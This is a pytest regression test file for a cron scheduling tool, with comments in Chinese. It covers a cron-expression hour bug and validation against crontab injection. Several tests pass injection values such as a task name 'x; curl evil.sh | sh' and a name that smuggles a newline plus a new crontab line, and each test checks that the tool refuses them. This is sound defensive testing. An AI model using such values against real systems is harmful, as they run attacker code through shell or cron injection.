"""P0 定时任务修复的回归测试（fix/p0-schedule-cron）。

覆盖：
- cron 表达式整点 bug（"08:00" 曾变成 " 8 * * *" → 每小时第 8 分钟）
- 任务名/时间/repeat 校验（防 crontab 注入）
- cron 命令指向真正的 engine 入口（--run-schedule）
- 测试全程 mock subprocess，绝不触碰真实 crontab
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import tools.bobo_schedule as sched


@pytest.fixture
def fake_schedule_file(tmp_path, monkeypatch):
    f = tmp_path / "schedules.json"
    monkeypatch.setattr(sched, "SCHEDULE_FILE", str(f))
    return f


@pytest.fixture
def captured_cron(monkeypatch):
    """捕获 crontab 调用，不真正执行。"""
    calls = []

    class FakeCompleted:
        returncode = 0
        stdout = ""
        stderr = ""

    def fake_run(cmd, **kwargs):
        calls.append({"cmd": cmd, "input": kwargs.get("input", "")})
        return FakeCompleted()

    monkeypatch.setattr(sched.subprocess, "run", fake_run)
    return calls


# ── cron 表达式 ──────────────────────────────────────────────────────

class TestCronExpr:
    def test_exact_hour(self):
        # 回归："08:00" 曾生成 " 8 * * *"（minute 为空），变成每小时第 8 分钟
        assert sched._cron_expr("08:00", "daily") == "0 8 * * *"

    def test_midnight(self):
        assert sched._cron_expr("00:00", "daily") == "0 0 * * *"

    def test_normal_time(self):
        assert sched._cron_expr("8:30", "daily") == "30 8 * * *"

    def test_weekdays(self):
        assert sched._cron_expr("09:05", "weekdays") == "5 9 * * 1-5"

    def test_hourly(self):
        assert sched._cron_expr("14:15", "hourly") == "15 * * * *"

    def test_invalid_times(self):
        assert sched._cron_expr("25:00", "daily") == ""
        assert sched._cron_expr("abc", "daily") == ""
        assert sched._cron_expr("", "daily") == ""
        assert sched._cron_expr("8:60", "daily") == ""


# ── 参数校验（防注入）────────────────────────────────────────────────

class TestValidation:
    def test_shell_injection_name_refused(self, fake_schedule_file, captured_cron):
        result = sched.execute(
            action="create", name="x; curl evil.sh | sh",
            task="t", time="08:00",
        )
        assert "❌" in result
        assert captured_cron == []  # 绝不能碰 crontab

    def test_newline_name_refused(self, fake_schedule_file, captured_cron):
        result = sched.execute(
            action="create", name="good\n* * * * * evil",
            task="t", time="08:00",
        )
        assert "❌" in result
        assert captured_cron == []

    def test_cron_expr_in_time_refused(self, fake_schedule_file, captured_cron):
        result = sched.execute(
            action="create", name="ok-name",
            task="t", time="0 8 * * * * cmd",
        )
        assert "❌" in result
        assert captured_cron == []

    def test_bad_repeat_refused(self, fake_schedule_file, captured_cron):
        result = sched.execute(
            action="create", name="ok-name",
            task="t", time="08:00", repeat="minutely",
        )
        assert "❌" in result
        assert captured_cron == []

    def test_chinese_name_accepted(self, fake_schedule_file, captured_cron):
        result = sched.execute(
            action="create", name="整理笔记",
            task="整理今天的笔记", time="08:00",
        )
        assert "已创建" in result

    def test_delete_validates_name(self, fake_schedule_file, captured_cron):
        result = sched.execute(action="delete", name="x;evil")
        assert "❌" in result


# ── cron 命令内容（接线修复）─────────────────────────────────────────

class TestCronWiring:
    def test_cron_points_to_real_entry(self, fake_schedule_file, captured_cron):
        sched.execute(action="create", name="morning-task", task="t", time="08:00")
        # 找到写入 crontab 的那次调用
        writes = [c for c in captured_cron if c["cmd"] == ["crontab", "-"]]
        assert len(writes) == 1
        cron_text = writes[0]["input"]
        assert "--run-schedule morning-task" in cron_text
        assert "bobo_tui_gateway.entry" in cron_text
        # 不再指向只 print 的旧入口
        assert "bobo_schedule.py --run" not in cron_text

    def test_cron_expr_in_crontab_line(self, fake_schedule_file, captured_cron):
        sched.execute(action="create", name="eight-am", task="t", time="08:00")
        writes = [c for c in captured_cron if c["cmd"] == ["crontab", "-"]]
        cron_text = writes[0]["input"]
        assert "0 8 * * *" in cron_text


# ── 健壮性 ───────────────────────────────────────────────────────────

class TestRobustness:
    def test_list_tolerates_malformed_entries(self, fake_schedule_file):
        fake_schedule_file.write_text(
            '[{"name": "a"}, {"bad": true}, "garbage", {"name": "b", "task": "x", "time": "08:00", "repeat": "daily"}]',
            encoding="utf-8",
        )
        result = sched.execute(action="list")
        assert "a" in result and "b" in result  # 不抛 KeyError

    def test_create_then_delete_roundtrip(self, fake_schedule_file, captured_cron):
        sched.execute(action="create", name="temp-task", task="t", time="09:00")
        result = sched.execute(action="delete", name="temp-task")
        assert "已删除" in result
        import json
        assert json.loads(fake_schedule_file.read_text()) == []
